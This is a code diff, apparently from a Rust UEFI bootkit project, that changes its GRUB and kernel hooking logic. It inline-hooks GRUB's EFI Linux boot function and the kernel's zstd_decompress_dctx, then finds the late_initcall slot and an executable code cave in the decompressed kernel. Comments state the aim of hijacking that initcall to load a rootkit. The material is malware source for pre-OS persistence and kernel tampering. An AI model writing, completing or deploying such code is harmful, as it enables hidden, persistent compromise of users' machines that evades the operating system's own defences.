@@ -1,8 +1,12 @@
-use crate::helpers::memory_helper::{
-    INLINE_HOOK_SIZE, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
-    inline_jump_hook, restore_inline_hook,
-};
 use log::{debug, error};
+
+use crate::helpers::{
+    file_helper::{Permissions, cave_finder},
+    memory_helper::{
+        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
+        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+    },
+};
 
 pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
     target: 0,
@@ -87,14 +91,14 @@ pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
         Some(addr) => addr,
         None => {
             error!("Failed to find target function in original GRUB");
-            
+
             return original_fn(kernel_entry, kernel_size, args);
         }
     };
 
     if target == 0 {
         error!("Failed to find target function in original GRUB");
-        
+
         return original_fn(kernel_entry, kernel_size, args);
     }
     debug!("Found target function at address: {:#x}", target);
@@ -105,7 +109,7 @@ pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
         Ok(info) => info,
         Err(e) => {
             error!("Failed to install inline hook, reason {:?}", e);
-            
+
             return original_fn(kernel_entry, kernel_size, args);
         }
     };
@@ -116,20 +120,20 @@ pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
         "Installed zstd_decompress_dctx_hook at address: {:#x}",
         vmlinuz_hook
     );
-    
+
     // Call the original callee that was held in rax at the patched call site.
     original_fn(kernel_entry, kernel_size, args)
 }
 
 /// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
-/// 
+///
 /// # Arguments:
 /// - `dctx`: The decompression context.
 /// - `dst`: The destination buffer for the decompressed data.
 /// - `dst_capacity`: The capacity of the destination buffer.
 /// - `src`: The source buffer containing the compressed data.
 /// - `src_size`: The size of the source buffer.
-/// 
+///
 /// # Returns:
 /// - `isize`: The return value from the original function, or -1 if an error occurs.
 pub extern "sysv64" fn zstd_decompress_dctx_hook(
@@ -139,8 +143,10 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     src: usize,
     src_size: usize,
 ) -> isize {
-    debug!("zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
-        dctx, dst, dst_capacity, src, src_size);
+    debug!(
+        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
+        dctx, dst, dst_capacity, src, src_size
+    );
 
     let target =
         unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
@@ -149,7 +155,7 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     };
     if target == 0 {
         error!("Hook target was not initialized");
-        
+
         return -1;
     }
     if let Err(e) = restore_inline_hook(target, &original_bytes) {
@@ -165,6 +171,28 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         dctx, dst, dst_capacity, src, src_size
     );
 
-    // TODO: Deploy the kernel hook here to overwrite the switch_root handler and load the rootkit.
+    // TODO: Deploy the kernel hook here to overwrite the pointer at the late_initcall slot with the address of our init function.
+    let late_initcall_addr =
+        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to find late_initcall address in kernel");
+                return ret_val;
+            }
+        };
+    debug!("Found late_initcall at address: {:#x}", late_initcall_addr);
+    let code_cave = match cave_finder(
+        dst,
+        dst_capacity,
+        0x1000,
+        Permissions::READ | Permissions::EXECUTE,
+    ) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find suitable code cave in kernel");
+            return ret_val;
+        }
+    };
+    debug!("Found suitable code cave at address: {:#x}", code_cave);
     ret_val
 }
